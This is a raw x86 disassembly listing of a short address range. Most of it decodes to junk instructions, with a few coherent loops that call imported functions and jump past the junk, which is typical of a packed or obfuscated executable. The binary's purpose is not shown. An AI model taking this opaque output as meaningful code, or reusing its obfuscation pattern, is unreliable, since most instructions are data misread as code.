  411fdb:	es and eax,0x84dd3a70
  411fe1:	push   edx
  411fe2:	xchg   edi,eax
  411fe3:	dec    ebp
  411fe4:	xor    al,0xbd
  411fe6:	je     0x411fe4
  411fe8:	pop    ss
  411fe9:	hlt    
  411fea:	fsubr  DWORD PTR [ebx+0x8186df8]
  411ff0:	inc    ebp
  411ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff2:	js     0x411f8a
  411ff4:	test   BYTE PTR [ebp-0x1],bl
  411ff7:	xchg   edx,eax
  411ff8:	jge    0x412013
  411ffa:	ret    
  411ffb:	pop    edi
  411ffc:	popa   
  411ffd:	inc    eax
  411ffe:	inc    ebx
  411fff:	adc    eax,0x1367c6d6
  412004:	sbb    DWORD PTR [edx+0x21],ebx
  412007:	sub    DWORD PTR [ecx-0x53ed9e97],0xffffff85
  41200e:	add    ebx,DWORD PTR [ebx-0x5c680e3f]
  412014:	xchg   DWORD PTR [esi],ebx
  412016:	mov    edi,0xa0f2dad1
  41201b:	mov    ebp,0xb5f7a6df
  412020:	dec    esp
  412021:	fs out 0xf7,al
  412024:	loopne 0x411fd7
  412026:	smsw   WORD PTR [edi]
  412029:	(bad)  
  41202a:	push   edx
  41202b:	sub    eax,0xc267e2ba
  412030:	inc    ebp
  412031:	dec    esp
  412032:	je     0x412038
  412034:	push   ebp
  412035:	and    ebp,DWORD PTR [ecx-0x45]
  412038:	fwait
  412039:	adc    BYTE PTR [esi+0x7e4a2a4e],0xac
  412040:	mov    ebp,0xee720d5c
  412045:	std    
  412046:	mov    ebp,0x9a635bde
  41204b:	test   eax,0x9bec6e6c
  412050:	or     ebx,ecx
  412052:	int    0x82
  412054:	pop    esp
  412055:	sbb    DWORD PTR [edx+0x8],ebp
  412058:	adc    eax,0xa336eb3d
  41205d:	cmp    ah,BYTE PTR [esi]
  41205f:	dec    esi
  412060:	idiv   dh
  412062:	call   0xe06e:0x72963d96
  412069:	sar    ah,0x33
  41206c:	dec    edi
  41206d:	mul    BYTE PTR [ecx+0x15e4ddeb]
  412073:	in     al,0xb3
  412075:	xchg   BYTE PTR [eax],al
  412077:	push   esi
  412078:	dec    ebp
  412079:	jmp    0xbf934e1e
  41207e:	mov    edi,0xbc0087cb
  412083:	jmp    0x460e:0xd9d8ba6d
  41208a:	mov    dl,BYTE PTR [eax+0x4b]
  41208d:	scas   al,BYTE PTR es:[edi]
  41208e:	inc    ebx
  41208f:	jns    0x412040
  412091:	push   edx
  412092:	outs   dx,DWORD PTR ds:[esi]
  412093:	int    0xf3
  412095:	(bad)  
  412096:	jne    0x4120a3
  412098:	clc    
  412099:	(bad)  
  41209b:	mov    al,0x64
  41209d:	es xchg ebp,eax
  41209f:	jmp    0x10634c1d
  4120a4:	das    
  4120a5:	test   eax,0x8b18fa02
  4120aa:	inc    ebp
  4120ab:	or     BYTE PTR [ebx+0x240d8b00],cl
  4120b1:	mov    dl,0x41
  4120b3:	add    BYTE PTR [ecx],al
  4120b5:	or     BYTE PTR [esi+0x5d],bl
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fcf6
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fc55
  4120d3:	adc    DWORD PTR ds:0x42e66f,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e66b,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e683,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e67b,0x19
  412102:	cmp    DWORD PTR ds:0x42e67b,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e67b,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fcfe
  412121:	push   0x0
  412123:	push   0x42e1ed
  412128:	call   DWORD PTR ds:0x42e403
  41212e:	mov    ebx,DWORD PTR ds:0x42e67b
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e67b,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e0a0,0x42fc81
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	icebp  
  41216e:	dec    eax
  41216f:	(bad)  
  412170:	mov    ah,0x46
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x9a70707e
  41217a:	pop    edx
  41217b:	pushf  
  41217c:	push   0x5f
  41217e:	mov    ah,0xff
  412180:	mov    ch,0x3c
  412182:	cwde   
  412183:	pop    ecx
  412184:	fisubr DWORD PTR [edi-0x9]
  412187:	idiv   ch
  412189:	fwait
  41218a:	gs pop ecx
  41218c:	hlt    
  41218d:	cs sbb al,0x90
  412190:	test   edx,ebp
  412192:	out    dx,al
  412193:	hlt    
  412194:	outs   dx,BYTE PTR ds:[esi]
  412195:	popa   
  412196:	test   bh,dl
  412198:	add    dh,BYTE PTR cs:[ebx-0x67423ef6]
  41219f:	fs stos DWORD PTR es:[edi],eax
  4121a1:	or     BYTE PTR [eax],dh
  4121a3:	out    dx,eax
  4121a4:	or     BYTE PTR [edx],0x39
  4121a7:	mov    ds:0x3d625ca8,eax
  4121ac:	or     al,0xd3
  4121ae:	push   edx
  4121af:	mov    ch,0x8f
  4121b1:	or     eax,0x38fd6cfe
  4121b6:	out    0xde,eax
  4121b8:	(bad)  
  4121b9:	mov    DWORD PTR [eax-0x110b6f6d],ecx
  4121bf:	jnp    0x41220a
  4121c1:	jns    0x4121c1
  4121c3:	frstor [ebx+0x2a3714b6]
  4121c9:	sub    ch,BYTE PTR [ebx+0x3e510837]
  4121cf:	sbb    eax,0x7cd2def1
  4121d4:	out    0xd4,al
  4121d6:	mov    edi,0x852ed1b0
  4121db:	mov    al,0xf8
  4121dd:	out    0xf,al
  4121df:	fucomi st,st(1)
  4121e1:	adc    al,0xd7
  4121e3:	dec    BYTE PTR ds:0x5620d4b9
  4121e9:	and    eax,0x2d481436
  4121ee:	sub    ebp,DWORD PTR [edi+eax*8-0x2daa7683]
  4121f5:	jae    0x412228
  4121f7:	jg     0x412233
  4121f9:	inc    ecx
  4121fa:	sbb    BYTE PTR [ebx+0x4ec8b5a4],bl
  412200:	mov    al,ds:0xd2db8476
  412205:	shl    DWORD PTR [eax+0x148f5a18],1
  41220b:	jle    0x412280
  41220d:	test   dh,al
  41220f:	and    bl,BYTE PTR [esi-0x6f773977]
  412215:	dec    esi
  412216:	and    DWORD PTR [edi+0x1b530f64],edi
  41221c:	sub    bl,bh
  41221e:	sti    
  41221f:	jle    0x4121e4
  412221:	daa    
  412222:	cdq    
  412223:	addr16 pop esp
  412225:	xchg   ecx,eax
  412226:	aam    0xfd
  412228:	sub    eax,0x35a06252
  41222d:	mov    dh,0x19
  41222f:	outs   dx,DWORD PTR cs:[esi]
  412231:	mov    cl,0x64
  412233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412234:	cwde   
  412235:	xor    bl,ah
  412237:	mov    eax,ds:0x23e344c6
  41223c:	and    al,0x6c
  41223e:	push   edx
  41223f:	pop    ss
  412240:	imul   edx,DWORD PTR [edi],0x68c5a927
  412246:	call   0x67be2d4e
  41224b:	or     BYTE PTR [ecx],cl
  41224d:	cld    
  41224e:	sbb    DWORD PTR [eax+0x57ea8425],ebx
  412254:	cmp    esp,esp
  412256:	mov    eax,ds:0x580aacd4
  41225b:	mov    ebx,0xec0bab77
  412261:	pop    ecx
  412262:	mov    ecx,0x57eaa0fa
  412267:	mov    ecx,0xac8345a1
  41226c:	aaa    
  41226d:	cmp    ah,BYTE PTR [ebx+0x6013d734]
  412273:	std    
  412274:	mov    ds:0x82c24859,eax
  412279:	dec    ecx
  41227a:	mov    ch,0x9a
  41227c:	jg     0x4122cd
  41227e:	mov    eax,esp
  412280:	hlt    
  412281:	ss cwde 
  412283:	inc    ecx
  412284:	div    eax
  412286:	outs   dx,DWORD PTR ds:[esi]
  412287:	fadd   st(4),st
  412289:	out    0x91,eax
  41228b:	mov    edx,0xe3b9a28b
  412290:	xchg   ecx,eax
  412291:	sub    al,0x1
  412293:	adc    BYTE PTR [ebp+0x36],bl
  412296:	sub    eax,0xd402bebb
  41229b:	sub    eax,0xa769c683
  4122a0:	inc    eax
  4122a1:	out    dx,eax
  4122a2:	push   edi
  4122a3:	push   ebx
  4122a4:	mov    ebp,0xac278511
  4122a9:	and    DWORD PTR [ebp-0x17],esp
  4122ac:	dec    eax
  4122ad:	ins    DWORD PTR es:[edi],dx
  4122ae:	aaa    
  4122af:	out    0xa8,eax
  4122b1:	xor    eax,0xec810515
  4122b6:	lods   eax,DWORD PTR ds:[esi]
  4122b7:	push   0x51
  4122b9:	or     DWORD PTR ss:[edi],0xffffffbb
  4122bd:	jns    0x412264
  4122bf:	shr    DWORD PTR [ebp+eiz*2-0x34],cl
  4122c3:	xchg   edx,eax
  4122c4:	fstp   QWORD PTR [eax-0x2f]
  4122c7:	fist   WORD PTR ds:0x2e17a1b5
  4122cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122ce:	repz ret 
  4122d0:	iret   
  4122d1:	lea    esi,[esi-0x2a]
  4122d4:	push   esp
  4122d5:	mov    BYTE PTR [edx-0x14153cbc],0xe1
  4122dc:	inc    edx
  4122dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122de:	sar    DWORD PTR [ebx-0x6aa9c92e],0xac
  4122e5:	pop    edx
  4122e6:	enter  0xe10,0x75
  4122ea:	sub    DWORD PTR [ebx+0x7a],esp
  4122ed:	push   eax
  4122ee:	out    0xfc,al
  4122f0:	inc    esi
  4122f1:	pop    es
  4122f2:	xor    esp,DWORD PTR [edi+0x1f5f8c09]
  4122f8:	(bad)  
  4122fa:	push   ecx
  4122fb:	shl    BYTE PTR [ebx+0x8df64b8],1
  412301:	xchg   edi,eax
  412302:	sub    DWORD PTR [esi],0xffffffcd
  412305:	das    
  412306:	add    DWORD PTR [ebx+0x2b],eax
  412309:	ja     0x41228d
  41230b:	fcmove st,st(0)
  41230d:	daa    
  41230e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41230f:	icebp  
  412310:	xchg   ebx,eax
  412311:	add    eax,0xa4d4637d
  412316:	in     eax,dx
  412317:	call   0x5895:0xb7a68f50
  41231e:	fwait
  41231f:	pop    edx
  412320:	xor    BYTE PTR [edi+0x1a5882],ah
  412326:	xor    eax,0x12c7f5d2
  41232b:	xor    BYTE PTR [esi+0x740f7015],bh
  412331:	test   cl,bl
  412333:	inc    edi
  412334:	jnp    0x412377
  412336:	adc    al,0xeb
  412338:	ds popa 
  41233a:	xor    al,0xb1
  41233c:	push   cs
  41233d:	sbb    eax,0x3fd7e74d
  412342:	dec    esi
  412343:	retf   0xfc43
  412346:	mov    esp,0xbc462a80
  41234b:	inc    edx
  41234c:	out    dx,al
  41234d:	xchg   ebx,eax
  41234e:	sti    
  41234f:	leave  
  412350:	test   BYTE PTR [ebx-0x5414d13a],0x59
  412357:	or     ebx,DWORD PTR [edx+0x133c98d6]
  41235d:	outs   dx,BYTE PTR ds:[esi]
  41235e:	push   edi
  41235f:	mov    ebp,0x9f9135e7
  412364:	pop    ebx
  412365:	sahf   
  412366:	sub    eax,0xe6a5d33b
  41236b:	ss mov edx,edx
  41236e:	test   eax,0x6e2aec43
  412373:	push   es
  412374:	stos   DWORD PTR es:[edi],eax
  412375:	fst    QWORD PTR [ebp+0x1f]
  412378:	add    al,0xc3
  41237a:	pop    edx
  41237b:	popa   
  41237c:	mov    eax,ds:0x5dad2d
  412381:	jno    0x41238e
  412383:	mov    ds:0xad4367e6,al
  412388:	jge    0x4123c6
  41238a:	sbb    dh,al
  41238c:	pop    ebp
  41238d:	pop    esi
  41238e:	(bad)  
  41238f:	jbe    0x412340
  412391:	and    al,0x61
  412393:	loopne 0x412410
  412395:	ror    BYTE PTR [ecx],0x65
  412398:	push   ds
  412399:	jae    0x41235b
  41239b:	and    BYTE PTR [ebp+0x3d711d25],0xa7
  4123a2:	pop    ebx
  4123a3:	xchg   ebp,eax
  4123a4:	(bad)  
  4123a5:	popa   
  4123a6:	mov    dl,0x1e
  4123a8:	pop    ebx
  4123a9:	add    BYTE PTR [edx],cl
  4123ab:	popf   
  4123ac:	mov    dh,0xfe
  4123ae:	and    eax,0xf917037c
  4123b3:	fnstsw WORD PTR [ecx+0x3b]
  4123b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123b7:	cmc    
  4123b8:	ins    DWORD PTR es:[edi],dx
  4123b9:	mov    eax,ds:0xed4c7939
  4123be:	dec    edi
  4123bf:	inc    ebx
  4123c0:	and    eax,0x8a8634a2
  4123c5:	fidiv  WORD PTR [edx+ebx*8-0x3888d0ae]
  4123cc:	and    dh,dh
  4123ce:	mov    esi,0xbba5bcd4
  4123d3:	aas    
  4123d4:	mov    BYTE PTR [ebx+0x54],bh
  4123d7:	mov    al,ds:0x25db7d5b
  4123dc:	push   edx
  4123dd:	fidivr DWORD PTR [edi]
  4123df:	es loopne 0x412407
  4123e2:	fwait
  4123e3:	sub    eax,0x3a871361
  4123e8:	xchg   edx,eax
  4123e9:	mov    BYTE PTR [esi-0xf],cl
  4123ec:	mov    al,ds:0xcc49293f
  4123f1:	or     DWORD PTR [ebx],ebp
  4123f3:	loopne 0x412456
  4123f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123f6:	lahf   
  4123f7:	dec    esi
  4123f8:	mov    esp,DWORD PTR [ebp+0x55e703c7]
  4123fe:	or     BYTE PTR [edi-0x88e9822],ch
  412404:	pop    edi
  412405:	adc    bl,BYTE PTR [esi+0x12]
  412408:	int    0x1
  41240a:	inc    ebp
  41240b:	out    0x99,al
  41240d:	xchg   esi,eax
  41240e:	(bad)  
  41240f:	push   ecx
  412410:	pop    ebp
  412411:	lock and dh,cl
  412414:	imul   esi,DWORD PTR [edx+0x3fd03e0a],0x70473888
  41241e:	xchg   edi,eax
  41241f:	int3   
  412420:	addr16 popa 
  412422:	or     DWORD PTR [edi],0xffffff99
  412425:	enter  0xd1c7,0xf1
  412429:	popa   
  41242a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41242b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41242c:	scas   eax,DWORD PTR es:[edi]
  41242d:	mov    ebp,0x36d73bd2
  412432:	sub    BYTE PTR [ebp-0xec9db7],cl
  412438:	stos   BYTE PTR es:[edi],al
  412439:	add    DWORD PTR [ecx+ebx*8-0xc],esi
  41243d:	mov    edx,0xcb038d56
  412442:	sub    DWORD PTR ds:0x42fc79,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	in     al,dx
  41245e:	in     eax,dx
  41245f:	pop    ebx
  412460:	sbb    eax,0x70705c8f
  412465:	mov    ecx,0xae70707e
  41246a:	cmp    al,0xaf
  41246c:	ficomp WORD PTR ds:0xd5a7972f
  412472:	shl    BYTE PTR [eax],1
  412474:	push   0x3b
  412476:	ds retf 0x4ff9
  41247a:	pushf  
  41247b:	inc    edi
  41247c:	cmp    esp,DWORD PTR [edx-0x76f2831f]
  412482:	mov    edi,0x215a5b05
  412487:	fcmovu st,st(0)
  412489:	inc    ebp
  41248a:	shl    BYTE PTR es:[edx],cl
  41248d:	mov    ecx,0xe6ea5c38
  412492:	mov    eax,0x31bcf2f4
  412497:	mov    eax,0xaf07f4ad
  41249c:	div    al
  41249e:	mov    ah,0xe2
  4124a0:	iret   
  4124a1:	int3   
  4124a2:	pop    ds
  4124a3:	sub    DWORD PTR [ecx+0x2e3c2b7b],eax
  4124a9:	lods   eax,DWORD PTR ds:[esi]
  4124aa:	pop    ebp
  4124ab:	xor    eax,edi
  4124ad:	imul   edi,esp,0x7f691cb9
  4124b3:	and    ch,ah
  4124b5:	mov    BYTE PTR [ebp+0x39cf2998],ah
  4124bb:	add    eax,0x6dfa5f3
  4124c0:	pop    ds
  4124c1:	inc    ebx
  4124c2:	cmp    al,0x9a
  4124c4:	adc    DWORD PTR ds:0xea61096,esp
  4124ca:	jecxz  0x41247c
  4124cc:	mov    eax,ds:0xf246c389
  4124d1:	sbb    esi,edx
  4124d3:	cmp    ah,BYTE PTR [esi]
  4124d5:	lods   eax,DWORD PTR ds:[esi]
  4124d6:	push   ss
  4124d7:	xchg   edi,eax
  4124d8:	repz pop esp
  4124da:	leave  
  4124db:	mov    bh,0x8c
  4124dd:	sbb    edi,DWORD PTR [edx+ebp*2]
  4124e0:	cli    
  4124e1:	jge    0x412482
  4124e3:	push   ebx
  4124e4:	mov    al,ds:0xff7cab2d
  4124e9:	pop    edi
  4124ea:	mov    bl,0x93
  4124ec:	scas   eax,DWORD PTR es:[edi]
  4124ed:	dec    esi
  4124ee:	fs pusha 
  4124f0:	push   ebp
  4124f1:	cld    
  4124f2:	(bad)  
  4124f3:	dec    ebp
  4124f4:	jecxz  0x4124d7
  4124f6:	loop   0x4124f3
  4124f8:	dec    esi
  4124f9:	repnz push 0x71
  4124fc:	jnp    0x412552
  4124fe:	push   0x4e
  412500:	mov    ebp,0x35bded1a
  412505:	adc    eax,0x9524b93b
  41250a:	out    dx,eax
  41250b:	add    al,0x92
  41250d:	aas    
  41250e:	jp     0x4124c3
  412510:	lahf   
  412511:	movq   mm1,QWORD PTR [ebx+eax*1-0x7c490b73]
  412519:	add    al,0x6c
  41251b:	outs   dx,BYTE PTR ds:[esi]
  41251c:	and    BYTE PTR [edi+0x36c7bd3c],0x17
  412523:	adc    BYTE PTR [ebx+0x50],bl
  412526:	add    eax,0x643fe725
  41252b:	psrld  mm0,QWORD PTR [edx-0x147dc4a3]
  412532:	and    BYTE PTR [ecx],ah
  412534:	outs   dx,BYTE PTR ds:[esi]
  412535:	push   edi
  412536:	sub    eax,0xaff7b8f7
  41253b:	jp     0x4125a1
  41253d:	jmp    0x412594
  41253f:	xchg   esp,eax
  412540:	in     eax,0xfa
  412542:	inc    edi
  412543:	adc    ah,dh
  412545:	cs jmp 0x412515
  412548:	jnp    0x412524
  41254a:	lods   eax,DWORD PTR ds:[esi]
  41254b:	jne    0x41255a
  41254d:	xchg   dl,dl
  41254f:	mov    bh,BYTE PTR [esi+edi*4+0x57f60f19]
  412556:	loopne 0x41258f
  412558:	jne    0x412532
  41255a:	test   ah,dh
  41255c:	add    ebx,DWORD PTR [esi+0x39]
  41255f:	jns    0x4125a5
  412561:	add    eax,0x9007e50c
  412566:	xlat   BYTE PTR ds:[ebx]
  412567:	fisubr DWORD PTR [edi+0x59a0afbe]
  41256d:	and    BYTE PTR [esi+0x670e9b73],0x15
  412574:	adc    BYTE PTR [esi+0x5de05442],bh
  41257a:	sub    dh,dh
  41257c:	xchg   esi,eax
  41257d:	jl     0x4125bc
  41257f:	aaa    
  412580:	sub    DWORD PTR cs:[ebp+0x59],ebp
  412584:	push   0x2c2a3da5
  412589:	bnd jp 0x4125f8
  41258c:	mov    ds:0x6627b6ce,al
  412591:	lds    esp,FWORD PTR [ebp-0x6c43f3cc]
  412597:	cmp    al,0xa0
  412599:	pop    ds
  41259a:	cs jp  0x41251d
  41259d:	mov    cl,0x4f
  41259f:	and    al,ah
  4125a1:	enter  0x4b1f,0x90
  4125a5:	mov    eax,ds:0xc6a9f5ba
  4125aa:	iret   
  4125ab:	cmp    esp,0xffffffb3
  4125ae:	dec    esi
  4125af:	cwde   
  4125b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125b1:	sbb    bl,BYTE PTR [ebp+0x38]
  4125b4:	push   eax
  4125b5:	sub    edi,DWORD PTR [ecx+0xda21cd5]
  4125bb:	retf   0x1ed9
  4125be:	outs   dx,BYTE PTR ds:[esi]
  4125bf:	push   ebx
  4125c0:	das    
  4125c1:	retf   
  4125c2:	sub    al,0x57
  4125c4:	cmp    eax,DWORD PTR [ebp-0x4163b5f0]
  4125ca:	jp     0x4125de
  4125cc:	cmc    
  4125cd:	fistp  QWORD PTR [ebx-0x1c1536c8]
  4125d3:	push   ds
  4125d4:	cmp    eax,0x299f56cf
  4125d9:	jno    0x412600
  4125db:	and    bh,dh
  4125dd:	adc    dl,cl
  4125df:	nop
  4125e0:	bound  edx,QWORD PTR [edx]
  4125e2:	mov    WORD PTR [eax+0x679ec756],fs
  4125e8:	mov    DWORD PTR [eax-0xd],ebp
  4125eb:	sub    esi,DWORD PTR [ecx+edi*1-0x8]
  4125ef:	add    DWORD PTR [edx-0x64b51491],esi
  4125f5:	sahf   
  4125f6:	cs add al,ch
  4125f9:	mov    eax,0x75cb632
  4125fe:	inc    edx
  4125ff:	fild   WORD PTR [ebp+ebp*1+0x20fe96cf]
  412606:	imul   edi,DWORD PTR [edi-0x7c],0x7f948817
  41260d:	fisubr WORD PTR [edi-0x569dc92a]
  412613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412614:	jp     0x412677
  412616:	lods   eax,DWORD PTR ds:[esi]
  412617:	lock ja 0x41264f
  41261a:	ds pop ebp
  41261c:	aam    0xdc
  41261e:	cwde   
  41261f:	mov    bl,0x5c
  412621:	jecxz  0x41267f
  412623:	push   edi
  412624:	pop    ecx
  412625:	out    0xf9,al
  412627:	fwait
  412628:	dec    ecx
  412629:	bound  esi,QWORD PTR [edx+0x55c8a0a9]
  41262f:	rcl    ebx,0x49
  412632:	mov    bh,0xeb
  412634:	inc    edi
  412635:	fsubr  QWORD PTR [ebp-0x349b56a4]
  41263b:	mov    DWORD PTR [eax],0x3e07a74e
  412641:	mov    edi,0xd16582e5
  412646:	out    0x7,eax
  412648:	jbe    0x412627
  41264a:	(bad)  
  41264b:	daa    
  41264c:	push   edi
  41264d:	aaa    
  41264e:	mov    WORD PTR ds:0x2ffd1df2,ds
  412654:	push   eax
  412655:	call   0x81cb:0x633bd55d
  41265c:	jp     0x412689
  41265e:	push   esp
  41265f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412660:	pop    esi
  412661:	sti    
  412662:	int    0x59
  412664:	scas   al,BYTE PTR es:[edi]
  412665:	ins    DWORD PTR es:[edi],dx
  412666:	test   al,0xe9
  412668:	inc    edi
  412669:	mov    al,ds:0x9af737fe
  41266e:	pop    es
  41266f:	stc    
  412670:	sub    dh,bh
  412672:	or     BYTE PTR [edi+edx*8+0x5fc86b97],bh
  412679:	adc    di,0x1ba8
  41267e:	je     0x4126fe
  412680:	sar    cl,0xd4
  412683:	add    BYTE PTR [edx+0xa4133db],bh
  412689:	mov    ah,0x7c
  41268b:	out    0xa9,eax
  41268d:	cmp    DWORD PTR [ecx+0x1e],0xaa07128c
  412694:	jg     0x4126a5
  412696:	fild   QWORD PTR [ebp-0x6d36167c]
  41269c:	mov    al,0x64
  41269e:	xchg   edx,eax
  41269f:	fwait
  4126a0:	sbb    bh,BYTE PTR [edi+0x380d34f4]
  4126a6:	mov    dh,0x85
  4126a8:	shr    BYTE PTR [edx-0x3b365671],0xd1
  4126af:	push   cs
  4126b0:	leave  
  4126b1:	call   0xa06d2674
  4126b6:	mov    al,ds:0xdb54d0ff
  4126bb:	push   ss
  4126bc:	stos   BYTE PTR es:[edi],al
  4126bd:	xlat   BYTE PTR ds:[ebx]
  4126be:	xchg   ebx,eax
  4126bf:	imul   ecx,DWORD PTR [eax-0x3ae0f721],0x4a
  4126c6:	stos   BYTE PTR es:[edi],al
  4126c7:	mov    ds:0x196e6a97,al
  4126cc:	outs   dx,DWORD PTR ds:[esi]
  4126cd:	mov    es,WORD PTR [ecx-0x21]
  4126d0:	loope  0x412670
  4126d2:	retf   0xaf52
  4126d5:	(bad)
  4126d8:	push   0xffffff9f
  4126da:	call   0xa25f:0x18129653
  4126e1:	sub    BYTE PTR [edi],dh
  4126e3:	mov    cl,0xfc
  4126e5:	outs   dx,DWORD PTR ds:[esi]
  4126e6:	arpl   bx,cx
  4126e8:	push   edx
  4126e9:	and    eax,esp
  4126eb:	outs   dx,DWORD PTR ds:[esi]
  4126ec:	pusha  
  4126ed:	and    al,ah
  4126ef:	into   
  4126f0:	jmp    0x99b1:0x182f207a
  4126f7:	cld    
  4126f8:	(bad)  
  4126f9:	cmp    al,0x62
  4126fb:	loope  0x412763
  4126fd:	leave  
  4126fe:	fwait
  4126ff:	ds add al,0x13
  412702:	int    0x3
  412704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412705:	pop    eax
  412706:	std    
  412707:	aaa    
  412708:	fstp   st(2)
  41270a:	dec    DWORD PTR [ebp+0x39fdcea6]
  412710:	mov    bh,0xd6
  412712:	cwde   
  412713:	or     edx,DWORD PTR [ecx-0x3d]
  412716:	sbb    DWORD PTR [eax+ecx*2],ebx
  412719:	idiv   BYTE PTR ds:0x70ba5f20
  41271f:	fs push esi
  412721:	inc    edi
  412722:	and    al,0x48
  412724:	cmp    eax,0x299017f9
  412729:	add    bl,BYTE PTR [edx+0x49]
  41272c:	jno    0x4126cc
  41272e:	clc    
  41272f:	cmc    
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fcf6,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fcf6
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fcf6,ecx
  412751:	cmp    DWORD PTR ds:0x42fcf6,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fcf6,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e293
  41277c:	cmp    DWORD PTR ds:0x42fcf6,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fcf6
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fcf6,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fcee,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ebx,edi
  4127be:	and    DWORD PTR [edx-0x15],0x707059c8
  4127c5:	mov    ecx,0x9270707e
  4127ca:	mov    ah,0xd8
  4127cc:	je     0x4127ec
  4127ce:	fcom   DWORD PTR [ebx]
  4127d0:	mov    dl,0x4b
  4127d2:	in     al,0x59
  4127d4:	and    DWORD PTR ds:0x760809aa,esp
  4127da:	ficomp WORD PTR [ebx-0x2f]
  4127dd:	sub    eax,0xdb224f40
  4127e2:	pop    eax
  4127e3:	icebp  
  4127e4:	add    al,0xf1
  4127e6:	ins    BYTE PTR es:[edi],dx
  4127e7:	cmp    bh,BYTE PTR cs:[edi+0x33]
  4127eb:	aaa    
  4127ec:	fcmovne st,st(7)
  4127ee:	xchg   ecx,eax
  4127ef:	sahf   
  4127f0:	das    
  4127f1:	or     DWORD PTR [edi],eax
  4127f3:	scas   al,BYTE PTR es:[edi]
  4127f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f5:	stc    
  4127f6:	mov    DWORD PTR [esi-0x37a405c8],0xc4774f1f
  412800:	aad    0x49
  412802:	popa   
  412803:	(bad)  
  412805:	xchg   esp,eax
  412806:	jle    0x412854
  412808:	pop    es
  412809:	jge    0x41278f
  41280b:	ret    
  41280c:	je     0x412859
  41280e:	xchg   esi,eax
  41280f:	pop    ebp
  412810:	inc    al
  412812:	mov    ebx,0x5a0153d6
  412817:	sub    al,0xf5
  412819:	call   0x8814c28
  41281e:	retf   
  41281f:	mov    esi,0xa635da83
  412824:	jl     0x412818
  412826:	call   0xa8949e6e
  41282b:	xor    BYTE PTR [edi+0x23],dl
  41282e:	ja     0x41286c
  412830:	mul    BYTE PTR [esp+ebx*4+0x47]
  412834:	mov    al,ds:0x554e4cdf
  412839:	imul   ebp,DWORD PTR [edi+0x33446444],0xfffffff1
  412840:	sbb    eax,DWORD PTR [edi+ebp*4-0x3be343f9]
  412847:	rcl    edx,cl
  412849:	test   DWORD PTR [eax-0x10],edi
  41284c:	cmp    eax,0xd62f4986
  412851:	sbb    eax,0x960bd830
  412856:	adc    DWORD PTR [ebp-0x4d852458],edx
  41285c:	fdiv   QWORD PTR [esi+ecx*4-0x62]
  412860:	mov    ecx,0xb88d3abf
  412865:	xchg   esp,eax
  412866:	adc    cl,al
  412868:	xor    dl,ah
  41286a:	test   eax,0x9436967e
  41286f:	mov    ch,0x17
  412871:	and    ebp,DWORD PTR [edx+0x5a74f272]
  412877:	push   cs
  412878:	or     BYTE PTR [esi-0x20],bh
  41287b:	popa   
  41287c:	shl    esp,cl
  41287e:	push   eax
  41287f:	dec    BYTE PTR [edx+0x46015383]
  412885:	fisubr DWORD PTR [ebx]
  412887:	pop    ecx
  412888:	jns    0x4128aa
  41288a:	inc    edx
  41288b:	js     0x412825
  41288d:	xor    ah,dh
  41288f:	and    al,0x3a
  412891:	xchg   ch,bh
